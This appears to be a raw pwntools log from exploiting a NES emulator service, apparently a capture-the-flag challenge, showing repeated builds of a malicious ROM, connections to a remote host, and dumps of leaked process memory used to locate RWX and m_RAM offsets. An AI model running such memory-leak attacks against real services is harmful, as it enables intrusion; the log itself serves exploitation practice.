[x] Opening connection to localhost on port 1337
[x] Opening connection to localhost on port 1337: Trying ::1
[+] Opening connection to localhost on port 1337: Done
[*] Closed connection to localhost port 1337
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
[*] 0x3dacc0: 0x00007f55a9b87b20 0x00007f55a9b882e0
[*] 0x3dacd0: 0x00007f55a9da2aa0 0x00007f55a9b82c20
[*] 0x3dace0: 0x00007f55a9b82c20 0x00007f55a9b82c20
[*] 0x3dacf0: 0x00007f55a9b82c20 0x00007f55a9b814e0
[*] 0x3dad00: 0x00007f55a9b7f020 0x00007f55a9da2aa0
[*] 0x3dad10: 0x00007f55a9b7f040 0x00007f55a9da2aa0
[*] 0x3dad20: 0x00007f55a9b7f060 0x00007f55a9da2aa0
[*] 0x3dad30: 0x00007f55a9da2aa0 0x00007f55a9b83500
[*] 0x3dad40: 0x00007f55a9da2aa0 0x00007f55a9da2aa0
[*] 0x3dad50: 0x00007f55a9da2aa0 0x00007f55a9b81500
[*] 0x3dad60: 0x00007f55a9da2aa0 0x00007f55a9b81040
[*] 0x3dad70: 0x00007f55a9b81a40 0x00007f55a9da2aa0
[*] 0x3dad80: 0x00007f55a9b80c60 0x00007f55a9b80c60
[*] 0x3dad90: 0x00007f55a9da2aa0 0x00007f55a9da2aa0
[*] 0x3dada0: 0x00007f55a9da2aa0 0x00007f55a9b7e3e0
[*] 0x3dadb0: 0x00007f55a9da2aa0 0x00007f55a9b83240
[*] 0x3dadc0: 0x00007f55a9b82f40 0x00007f55a9da2aa0
[*] 0x3dadd0: 0x00007f55a9da2aa0 0x00007f55a9da2aa0
[*] 0x3dade0: 0x00007f55a9b7e400 0x00007f55a9b7e420
[*] 0x3dadf0: 0x00007f55a9da2aa0 0x00007f55a9b87360
[*] 0x3dae00: 0x00007f55a9b87360 0x00007f55a9da2aa0
[*] 0x3dae10: 0x00007f55a9da2aa0 0x00007f55a9da2aa0
[*] 0x3dae20: 0x00007f55a9da2aa0 0x00007f55a9da2aa0
[*] 0x3dae30: 0x00007f55a9da2aa0 0x00007f55a9da2aa0
[*] 0x3dae40: 0x00007f55a9da2aa0 0x00007f55a9da2aa0
[*] 0x3dae50: 0x00007f55a9da2aa0 0x00007f55a9b7e440
[*] 0x3dae60: 0x00007f55a9b7e460 0x00007f55a9b7e480
[*] 0x3dae70: 0x00007f55a9da2aa0 0x00007f55a9b7e4a0
[*] 0x3dae80: 0x00007f55a9b7e4c0 0x00007f55a9da2aa0
[*] 0x3dae90: 0x00007f55a9b87380 0x00007f55a9b87380
[*] 0x3daea0: 0x00007f55a9da2aa0 0x00007f55a9b86b00
[*] 0x3daeb0: 0x00007f55a9b7f080 0x00007f55a9da2aa0
[*] 0x3daec0: 0x00007f55a9b7f0a0 0x00007f55a9da2aa0
[*] 0x3daed0: 0x00007f55a9b7f0c0 0x00007f55a9da2aa0
[*] 0x3daee0: 0x00007f55a9b87d00 0x00007f55a9b87ce0
[*] 0x3daef0: 0x00007f55a9b88020 0x00007f55a9b88040
[*] 0x3daf00: 0x00007f55a9b88060 0x00007f55a9b87da0
[*] 0x3daf10: 0x00007f55a9b882a0 0x00007f55a9b88280
[*] 0x3daf20: 0x00007f55a9b885a0 0x00007f55a9b885c0
[*] 0x3daf30: 0x00007f55a9b87ea0 0x00007f55a9b87e80
[*] 0x3daf40: 0x00007f55a9b81b60 0x00007f55a9da2aa0
[*] 0x3daf50: 0x00007f55a9b83b40 0x00007f55a9da2aa0
[*] 0x3daf60: 0x00007f55a9b83b60 0x00007f55a9b87a80
[*] 0x3daf70: 0x00007f55a9da2aa0 0x00007f55a9b83b80
[*] 0x3daf80: 0x00007f55a9b87a60 0x00007f55a9b83ba0
[*] 0x3daf90: 0x00007f55a9b87a40 0x00007f55a9b83bc0
[*] 0x3dafa0: 0x00007f55a9b87be0 0x00007f55a9da2aa0
[*] 0x3dafb0: 0x00007f55a9b83be0 0x00007f55a9b88940
[*] 0x3dafc0: 0x00007f55a9da2aa0 0x00007f55a9da2aa0
[*] 0x3dafd0: 0x00007f55a9b88460 0x00007f55a9b88400
[*] 0x3dafe0: 0x00007f55a9b883a0 0x00007f55a9b88480
[*] 0x3daff0: 0x00007f55a9b83c00 0x00007f55a9b88320
[*] rwx: 0xe183060301800
[*] m_RAM: 0x557e0078abc0
[*] m_RAM_rwx_off: 0xdc2b25fb76c40
[*] Closed connection to 91.107.157.58 port 3000
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
ca65 -t c64 pwn_asm.s
cl65 -o ../pwn.nes -t nes pwn.o pwn_asm.o
[*] offset: 0x3db000
[x] Opening connection to 91.107.157.58 on port 3000
[x] Opening connection to 91.107.157.58 on port 3000: Trying 91.107.157.58
[+] Opening connection to 91.107.157.58 on port 3000: Done
b'[MainBus.cpp:12] Allocated m_RAM at: 0x55555587c210\nFailed to create /home/pwn/.cache for shader cache (Permission denied)---disabling.\n[Cartridge.cpp:52] Reading ROM from path: /tmp/tmpccje4a1n\n[Cartridge.cpp:70] Reading header, it dictates: \n[Cartridge.cpp:73] 16KB PRG-ROM Banks: 2\n[Cartridge.cpp:81] 8KB CHR-ROM Banks: 1\n[Cartridge.cpp:91] Name Table Mirroring: Vertical\n[Cartridge.cpp:95] Mapper #: 11\n[Cartridge.cpp:98] Extended (CPU) RAM: true\n[Cartridge.cpp:112] ROM is NTSC compatible.\n[Cartridge.cpp:121] Allocated m_PRG_ROM at: 0x555555c6f490\n[Cartridge.cpp:127] Allocated m_CHR_ROM at: 0x555555c774a0\nError while enumerating udev devices\nSetting vertical sync not supported\n\x16\r'
4096
2048
[*] 0x3db000: 0x00007f16bfe32b60 0x00007f16bfe32b80
[*] 0x3db010: 0x00007f16bfe30920 0x00007f17c004caa0
[*] 0x3db020: 0x00007f16c004caa0 0x00007f16bfe2f4a0
[*] 0x3db030: 0x00007f16bfe332c0 0x00007f16bfe2f4a0
[*] 0x3db040: 0x00007f16c004caa0 0x00007f16bfe2b520
[*] 0x3db050: 0x00007f16bfe30660 0x00007f16bfe2b540
[*] 0x3db060: 0x00007f16bfe2f4c0 0x00007f16bfe2f4c0
[*] 0x3db070: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db080: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db090: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db0a0: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db0b0: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db0c0: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db0d0: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db0e0: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db0f0: 0x00007f16bfe30940 0x00007f16bfe30580
[*] 0x3db100: 0x00007f16bfe305a0 0x00007f16bfe305c0
[*] 0x3db110: 0x00007f16bfe305e0 0x00007f16bfe30600
[*] 0x3db120: 0x00007f16bfe30620 0x00007f16bfe30960
[*] 0x3db130: 0x00007f16bfe30980 0x00007f16bfe309a0
[*] 0x3db140: 0x00007f16bfe284e0 0x00007f16bfe28500
[*] 0x3db150: 0x00007f16bfe28520 0x00007f16c004caa0
[*] 0x3db160: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db170: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db180: 0x00007f16bfe31c40 0x00007f16bfe31c40
[*] 0x3db190: 0x00007f16bfe28c20 0x00007f16bfe28c20
[*] 0x3db1a0: 0x00007f16bfe28c20 0x00007f16c004caa0
[*] 0x3db1b0: 0x00007f16bfe28540 0x00007f16bfe2c940
[*] 0x3db1c0: 0x00007f16bfe2c940 0x00007f16c004caa0
[*] 0x3db1d0: 0x00007f16c004caa0 0x00007f16bfe2b120
[*] 0x3db1e0: 0x00007f16bfe2b140 0x00007f16bfe2a0e0
[*] 0x3db1f0: 0x00007f16bfe2d2a0 0x00007f16c004caa0
[*] 0x3db200: 0x00007f16c004caa0 0x00007f16bfe2b160
[*] 0x3db210: 0x00007f16bfe2b180 0x00007f16bfe300e0
[*] 0x3db220: 0x00007f16bfe30100 0x00007f16bfe2f7a0
[*] 0x3db230: 0x00007f16bfe2f7c0 0x00007f16bfe2ece0
[*] 0x3db240: 0x00007f16bfe2ece0 0x00007f16bfe2ed00
[*] 0x3db250: 0x00007f16bfe2ed00 0x00007f16bfe2d2c0
[*] 0x3db260: 0x00007f16bfe2d2e0 0x00007f16bfe2d300
[*] 0x3db270: 0x00007f16bfe2d300 0x00007f16bfe2d320
[*] 0x3db280: 0x00007f16c004caa0 0x00007f16bfe2d340
[*] 0x3db290: 0x00007f16bfe2c660 0x00007f16bfe2b1a0
[*] 0x3db2a0: 0x00007f16bfe2f7e0 0x00007f16c004caa0
[*] 0x3db2b0: 0x00007f16bfe2a100 0x00007f16bfe2b1c0
[*] 0x3db2c0: 0x00007f16bfe2f800 0x00007f16bfe2dc20
[*] 0x3db2d0: 0x00007f16bfe2dc40 0x00007f16bfe2dc60
[*] 0x3db2e0: 0x00007f16bfe2dc80 0x00007f16bfe2c880
[*] 0x3db2f0: 0x00007f16bfe2be60 0x00007f16bfe2be60
[*] 0x3db300: 0x00007f16bfe29e00 0x00007f16bfe29e00
[*] 0x3db310: 0x00007f16bfe29e00 0x00007f16bfe2be80
[*] 0x3db320: 0x00007f16bfe2be80 0x00007f16c004caa0
[*] 0x3db330: 0x00007f16bfe29e20 0x00007f16bfe29e20
[*] 0x3db340: 0x00007f16bfe29e20 0x00007f16bfe29e40
[*] 0x3db350: 0x00007f16bfe29e40 0x00007f16bfe29e40
[*] 0x3db360: 0x00007f16bfe2b780 0x00007f16bfe2b780
[*] 0x3db370: 0x00007f16bfe2b780 0x00007f16bfe2bd00
[*] 0x3db380: 0x00007f16bfe2bd00 0x00007f16bfe2bd00
[*] 0x3db390: 0x00007f16bfe2bd20 0x00007f16bfe2bd20
[*] 0x3db3a0: 0x00007f16bfe2bd20 0x00007f16bfe2bd40
[*] 0x3db3b0: 0x00007f16bfe2bd60 0x00007f16bfe30b20
[*] 0x3db3c0: 0x00007f16bfe28fe0 0x00007f16c004caa0
[*] 0x3db3d0: 0x00007f16bfe2a120 0x00007f16bfe2c8e0
[*] 0x3db3e0: 0x00007f16bfe2a140 0x00007f16bfe2a140
[*] 0x3db3f0: 0x00007f16bfe2a160 0x00007f16c004caa0
[*] 0x3db400: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db410: 0x00007f16c004caa0 0x00007f16bfe28560
[*] 0x3db420: 0x00007f16bfe2ac80 0x00007f16bfe2c680
[*] 0x3db430: 0x00007f16bfe2c6a0 0x00007f16bfe2ba60
[*] 0x3db440: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db450: 0x00007f16bfe2fe40 0x00007f16bfe2fe60
[*] 0x3db460: 0x00007f16bfe28580 0x00007f16bfe285a0
[*] 0x3db470: 0x00007f16bfe313a0 0x00007f16bfe313a0
[*] 0x3db480: 0x00007f16c004caa0 0x00007f16bfe285c0
[*] 0x3db490: 0x00007f16bfe285e0 0x00007f16bfe285e0
[*] 0x3db4a0: 0x00007f16bfe28600 0x00007f16bfe28600
[*] 0x3db4b0: 0x00007f16bfe301c0 0x00007f16bfe28620
[*] 0x3db4c0: 0x00007f16c004caa0 0x00007f16bfe28680
[*] 0x3db4d0: 0x00007f16c004caa0 0x00007f16bfe286a0
[*] 0x3db4e0: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db4f0: 0x00007f16bfe2aca0 0x00007f16bfe2aca0
[*] 0x3db500: 0x00007f16bfe2aca0 0x00007f16bfe2acc0
[*] 0x3db510: 0x00007f16bfe2acc0 0x00007f16bfe2acc0
[*] 0x3db520: 0x00007f16c004caa0 0x00007f16bfe28640
[*] 0x3db530: 0x00007f16bfe28660 0x00007f16bfe313c0
[*] 0x3db540: 0x00007f16bfe313c0 0x00007f16bfe2d520
[*] 0x3db550: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db560: 0x00007f16bfe2dca0 0x00007f16bfe319e0
[*] 0x3db570: 0x00007f16bfe2dcc0 0x00007f16bfe31a20
[*] 0x3db580: 0x00007f16bfe2dce0 0x00007f16bfe31a00
[*] 0x3db590: 0x00007f16bfe2dd00 0x00007f16bfe32520
[*] 0x3db5a0: 0x00007f16bfe2dd20 0x00007f16bfe32540
[*] 0x3db5b0: 0x00007f16bfe2dd40 0x00007f16bfe31940
[*] 0x3db5c0: 0x00007f16bfe2dd60 0x00007f16bfe31920
[*] 0x3db5d0: 0x00007f16bfe2d540 0x00007f16c004caa0
[*] 0x3db5e0: 0x00007f16c004caa0 0x00007f16bfe2e3c0
[*] 0x3db5f0: 0x00007f16bfe2f820 0x00007f16bfe2ace0
[*] 0x3db600: 0x00007f16bfe2ace0 0x00007f16c004caa0
[*] 0x3db610: 0x00007f16bfe2dd80 0x00007f16bfe2dda0
[*] 0x3db620: 0x00007f16bfe2ddc0 0x00007f16c004caa0
[*] 0x3db630: 0x00007f16bfe2b960 0x00007f16c004caa0
[*] 0x3db640: 0x00007f16bfe2b980 0x00007f16bfe2a180
[*] 0x3db650: 0x00007f16bfe2a180 0x00007f16c004caa0
[*] 0x3db660: 0x00007f16bfe2c6c0 0x00007f16bfe2c3c0
[*] 0x3db670: 0x00007f16bfe2a1a0 0x00007f16bfe2a1a0
[*] 0x3db680: 0x00007f16bfe2e420 0x00007f16bfe2e420
[*] 0x3db690: 0x00007f16bfe2a1c0 0x00007f16bfe2a1c0
[*] 0x3db6a0: 0x00007f16bfe2e440 0x00007f16bfe2e440
[*] 0x3db6b0: 0x00007f16bfe2ad00 0x00007f16bfe2ad00
[*] 0x3db6c0: 0x00007f16bfe30b40 0x00007f16bfe30b60
[*] 0x3db6d0: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db6e0: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db6f0: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db700: 0x00007f16c004caa0 0x00007f16bfe2dde0
[*] 0x3db710: 0x00007f16bfe2de00 0x00007f16bfe328a0
[*] 0x3db720: 0x00007f16bfe32860 0x00007f16bfe328c0
[*] 0x3db730: 0x00007f16bfe32880 0x00007f16bfe2de20
[*] 0x3db740: 0x00007f16c004caa0 0x00007f16c004caa0
[*] 0x3db750: 0x00007f16bfe2ad20 0x00007f16bfe2ad20
[*] 0x3db760: 0x00007f16bfe2ad40 0x00007f16bfe2ad40
[*] 0x3db770: 0x00007f16bfe2c9a0 0x00007f16bfe2c9a0
[*] 0x3db780: 0x00007f16c004caa0 0x00007f16bfe2d560
[*] 0x3db790: 0x00007f16c004caa0 0x00007f16bfe2a1e0
[*] 0x3db7a0: 0x00007f16bfe2a1e0 0x00007f16bfe2a1e0
[*] 0x3db7b0: 0x00007f16bfe2a200 0x00007f16bfe2a200
[*] 0x3db7c0: 0x00007f16bfe2f840 0x00007f16bfe2a220
[*] 0x3db7d0: 0x00007f16bfe2a220 0x00007f16bfe2f860
[*] 0x3db7e0: 0x00007f16bfe2a240 0x00007f16bfe2a240
[*] 0x3db7f0: 0x00007f16bfe2f880 0x00007f16c004caa0
[*] rwx: 0xe183060301800
[*] m_RAM: 0x557e0078abc0
[*] m_RAM_rwx_off: 0xdc2b25fb76c40
[*] Closed connection to 91.107.157.58 port 3000
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
ca65 -t c64 pwn_asm.s
cl65 -o ../pwn.nes -t nes pwn.o pwn_asm.o
[*] offset: 0x3db800
[x] Opening connection to 91.107.157.58 on port 3000
[x] Opening connection to 91.107.157.58 on port 3000: Trying 91.107.157.58
[+] Opening connection to 91.107.157.58 on port 3000: Done
b'[MainBus.cpp:12] Allocated m_RAM at: 0x5555566c1210\nFailed to create /home/pwn/.cache for shader cache (Permission denied)---disabling.\n[Cartridge.cpp:52] Reading ROM from path: /tmp/tmpdkzhmlse\n[Cartridge.cpp:70] Reading header, it dictates: \n[Cartridge.cpp:73] 16KB PRG-ROM Banks: 2\n[Cartridge.cpp:81] 8KB CHR-ROM Banks: 1\n[Cartridge.cpp:91] Name Table Mirroring: Vertical\n[Cartridge.cpp:95] Mapper #: 11\n[Cartridge.cpp:98] Extended (CPU) RAM: true\n[Cartridge.cpp:112] ROM is NTSC compatible.\n[Cartridge.cpp:121] Allocated m_PRG_ROM at: 0x555556ab4490\n[Cartridge.cpp:127] Allocated m_CHR_ROM at: 0x555556abc4a0\nError while enumerating udev devices\nSetting vertical sync not supported\n\xd6\r'
4096
2048
[*] 0x3db800: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3db810: 0x00007fd6a85bdaa0 0x00007fd7a85bdaa0
[*] 0x3db820: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3db830: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3db840: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3db850: 0x00007fd6a839dc40 0x00007fd6a85bdaa0
[*] 0x3db860: 0x00007fd6a839dc60 0x00007fd6a85bdaa0
[*] 0x3db870: 0x00007fd6a839dc80 0x00007fd6a85bdaa0
[*] 0x3db880: 0x00007fd6a839dca0 0x00007fd6a85bdaa0
[*] 0x3db890: 0x00007fd6a839dcc0 0x00007fd6a85bdaa0
[*] 0x3db8a0: 0x00007fd6a839dce0 0x00007fd6a85bdaa0
[*] 0x3db8b0: 0x00007fd6a839dd00 0x00007fd6a85bdaa0
[*] 0x3db8c0: 0x00007fd6a839dd20 0x00007fd6a85bdaa0
[*] 0x3db8d0: 0x00007fd6a839dd40 0x00007fd6a85bdaa0
[*] 0x3db8e0: 0x00007fd6a839dd60 0x00007fd6a85bdaa0
[*] 0x3db8f0: 0x00007fd6a839dd80 0x00007fd6a85bdaa0
[*] 0x3db900: 0x00007fd6a839dda0 0x00007fd6a85bdaa0
[*] 0x3db910: 0x00007fd6a839ddc0 0x00007fd6a85bdaa0
[*] 0x3db920: 0x00007fd6a839dde0 0x00007fd6a85bdaa0
[*] 0x3db930: 0x00007fd6a839de00 0x00007fd6a839de20
[*] 0x3db940: 0x00007fd6a839de20 0x00007fd6a839de20
[*] 0x3db950: 0x00007fd6a839de20 0x00007fd6a839f460
[*] 0x3db960: 0x00007fd6a839de40 0x00007fd6a839de40
[*] 0x3db970: 0x00007fd6a839de40 0x00007fd6a839de40
[*] 0x3db980: 0x00007fd6a839f480 0x00007fd6a839de60
[*] 0x3db990: 0x00007fd6a839de60 0x00007fd6a839de60
[*] 0x3db9a0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3db9b0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3db9c0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3db9d0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3db9e0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3db9f0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dba00: 0x00007fd6a83986c0 0x00007fd6a85bdaa0
[*] 0x3dba10: 0x00007fd6a839a0e0 0x00007fd6a85bdaa0
[*] 0x3dba20: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dba30: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dba40: 0x00007fd6a85bdaa0 0x00007fd6a83a1da0
[*] 0x3dba50: 0x00007fd6a83a4240 0x00007fd6a83a4280
[*] 0x3dba60: 0x00007fd6a83a1dc0 0x00007fd6a83a4260
[*] 0x3dba70: 0x00007fd6a83a42a0 0x00007fd6a85bdaa0
[*] 0x3dba80: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dba90: 0x00007fd6a8398d80 0x00007fd6a85bdaa0
[*] 0x3dbaa0: 0x00007fd6a8399a40 0x00007fd6a839fba0
[*] 0x3dbab0: 0x00007fd6a85bdaa0 0x00007fd6a8397880
[*] 0x3dbac0: 0x00007fd6a83978a0 0x00007fd6a83978c0
[*] 0x3dbad0: 0x00007fd6a83978e0 0x00007fd6a8397900
[*] 0x3dbae0: 0x00007fd6a8397920 0x00007fd6a8397940
[*] 0x3dbaf0: 0x00007fd6a8397960 0x00007fd6a8399a60
[*] 0x3dbb00: 0x00007fd6a8399a80 0x00007fd6a85bdaa0
[*] 0x3dbb10: 0x00007fd6a85bdaa0 0x00007fd6a8398ba0
[*] 0x3dbb20: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbb30: 0x00007fd6a85bdaa0 0x00007fd6a8399aa0
[*] 0x3dbb40: 0x00007fd6a85bdaa0 0x00007fd6a839f920
[*] 0x3dbb50: 0x00007fd6a839f940 0x00007fd6a839f960
[*] 0x3dbb60: 0x00007fd6a839ee40 0x00007fd6a839ee60
[*] 0x3dbb70: 0x00007fd6a839f980 0x00007fd6a839f9a0
[*] 0x3dbb80: 0x00007fd6a839f9c0 0x00007fd6a85bdaa0
[*] 0x3dbb90: 0x00007fd6a839ae60 0x00007fd6a839ae60
[*] 0x3dbba0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbbb0: 0x00007fd6a83996c0 0x00007fd6a839bd60
[*] 0x3dbbc0: 0x00007fd6a839bd60 0x00007fd6a839bd60
[*] 0x3dbbd0: 0x00007fd6a85bdaa0 0x00007fd6a839bd60
[*] 0x3dbbe0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbbf0: 0x00007fd6a839c7a0 0x00007fd6a839c7a0
[*] 0x3dbc00: 0x00007fd6a839c7a0 0x00007fd6a839e580
[*] 0x3dbc10: 0x00007fd6a85bdaa0 0x00007fd6a83996e0
[*] 0x3dbc20: 0x00007fd6a83a1b80 0x00007fd6a85bdaa0
[*] 0x3dbc30: 0x00007fd6a85bdaa0 0x00007fd6a83a3b40
[*] 0x3dbc40: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbc50: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbc60: 0x00007fd6a85bdaa0 0x00007fd6a839b260
[*] 0x3dbc70: 0x00007fd6a839c1e0 0x00007fd6a839c1e0
[*] 0x3dbc80: 0x00007fd6a839fd20 0x00007fd6a839fd20
[*] 0x3dbc90: 0x00007fd6a839ae80 0x00007fd6a839ae80
[*] 0x3dbca0: 0x00007fd6a839ae80 0x00007fd6a839c7c0
[*] 0x3dbcb0: 0x00007fd6a839c7c0 0x00007fd6a839c7c0
[*] 0x3dbcc0: 0x00007fd6a839cd80 0x00007fd6a83a1ba0
[*] 0x3dbcd0: 0x00007fd6a839b280 0x00007fd6a85bdaa0
[*] 0x3dbce0: 0x00007fd6a839ca80 0x00007fd6a85bdaa0
[*] 0x3dbcf0: 0x00007fd6a8399c40 0x00007fd6a8399c40
[*] 0x3dbd00: 0x00007fd6a839e5a0 0x00007fd6a85bdaa0
[*] 0x3dbd10: 0x00007fd6a839d7c0 0x00007fd6a85bdaa0
[*] 0x3dbd20: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbd30: 0x00007fd6a839c8c0 0x00007fd6a85bdaa0
[*] 0x3dbd40: 0x00007fd6a839c8c0 0x00007fd6a85bdaa0
[*] 0x3dbd50: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbd60: 0x00007fd6a85bdaa0 0x00007fd6a83a42e0
[*] 0x3dbd70: 0x00007fd6a85bdaa0 0x00007fd6a8398760
[*] 0x3dbd80: 0x00007fd6a8398780 0x00007fd6a83987a0
[*] 0x3dbd90: 0x00007fd6a83987c0 0x00007fd6a83a2000
[*] 0x3dbda0: 0x00007fd6a83a2000 0x00007fd6a83a2020
[*] 0x3dbdb0: 0x00007fd6a83a2020 0x00007fd6a83986e0
[*] 0x3dbdc0: 0x00007fd6a8398700 0x00007fd6a8398720
[*] 0x3dbdd0: 0x00007fd6a8398740 0x00007fd6a83a2040
[*] 0x3dbde0: 0x00007fd6a83a2040 0x00007fd6a83a2060
[*] 0x3dbdf0: 0x00007fd6a83a2060 0x00007fd6a83987e0
[*] 0x3dbe00: 0x00007fd6a8398800 0x00007fd6a83a2080
[*] 0x3dbe10: 0x00007fd6a83a2080 0x00007fd6a839b2a0
[*] 0x3dbe20: 0x00007fd6a839b2a0 0x00007fd6a83973c0
[*] 0x3dbe30: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbe40: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbe50: 0x00007fd6a85bdaa0 0x00007fd6a8399740
[*] 0x3dbe60: 0x00007fd6a85bdaa0 0x00007fd6a8399780
[*] 0x3dbe70: 0x00007fd6a8399760 0x00007fd6a83a20a0
[*] 0x3dbe80: 0x00007fd6a83a20a0 0x00007fd6a8398bc0
[*] 0x3dbe90: 0x00007fd6a85bdaa0 0x00007fd6a83a08a0
[*] 0x3dbea0: 0x00007fd6a85bdaa0 0x00007fd6a839a6e0
[*] 0x3dbeb0: 0x00007fd6a839a6e0 0x00007fd6a839a700
[*] 0x3dbec0: 0x00007fd6a839a700 0x00007fd6a85bdaa0
[*] 0x3dbed0: 0x00007fd6a839fd40 0x00007fd6a8399140
[*] 0x3dbee0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbef0: 0x00007fd6a839e5c0 0x00007fd6a85bdaa0
[*] 0x3dbf00: 0x00007fd6a839e5e0 0x00007fd6a85bdaa0
[*] 0x3dbf10: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] 0x3dbf20: 0x00007fd6a839e600 0x00007fd6a85bdaa0
[*] 0x3dbf30: 0x00007fd6a839e620 0x00007fd6a85bdaa0
[*] 0x3dbf40: 0x00007fd6a8398e80 0x00007fd6a8398ea0
[*] 0x3dbf50: 0x00007fd6a85bdaa0 0x00007fd6a8398ec0
[*] 0x3dbf60: 0x00007fd6a8398ee0 0x00007fd6a85bdaa0
[*] 0x3dbf70: 0x00007fd6a839aea0 0x00007fd6a839aea0
[*] 0x3dbf80: 0x00007fd6a839aea0 0x00007fd6a839c840
[*] 0x3dbf90: 0x00007fd6a839c840 0x00007fd6a85bdaa0
[*] 0x3dbfa0: 0x00007fd6a8398f00 0x00007fd6a8398f20
[*] 0x3dbfb0: 0x00007fd6a85bdaa0 0x00007fd6a8398f40
[*] 0x3dbfc0: 0x00007fd6a8398f60 0x00007fd6a85bdaa0
[*] 0x3dbfd0: 0x00007fd6a839ee80 0x00007fd6a83a2900
[*] 0x3dbfe0: 0x00007fd6a839eea0 0x00007fd6a83a2780
[*] 0x3dbff0: 0x00007fd6a85bdaa0 0x00007fd6a85bdaa0
[*] rwx: 0xe183060301800
[*] m_RAM: 0x557e0078abc0
[*] m_RAM_rwx_off: 0xdc2b25fb76c40
[*] Closed connection to 91.107.157.58 port 3000
cc65 -O -t c64 pwn.c
ca65 -t c64 pwn.s
ca65 -t c64 pwn_asm.s
cl65 -o ../pwn.nes -t nes pwn.o pwn_asm.o
[*] offset: 0x3dc000
[x] Opening connection to 91.107.157.58 on port 3000
[x] Opening connection to 91.107.157.58 on port 3000: Trying 91.107.157.58
[+] Opening connection to 91.107.157.58 on port 3000: Done
